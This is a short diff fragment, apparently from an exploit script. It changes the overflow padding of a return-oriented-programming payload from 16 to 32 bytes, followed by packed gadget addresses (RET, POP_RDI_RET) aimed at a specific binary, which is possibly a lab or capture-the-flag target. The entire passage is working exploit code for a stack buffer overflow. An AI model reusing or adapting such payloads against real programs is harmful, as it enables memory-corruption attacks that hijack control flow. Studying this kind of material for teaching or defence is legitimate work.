@@ -13,7 +13,7 @@ RET = 0x401AC2
 GRADE_EVAL = 0x401A87
 
 payload = (
-    b"A" * 16
+    b"A" * 32
     + p64(RET)
     + p64(POP_RDI_RET)
     + p64(4)
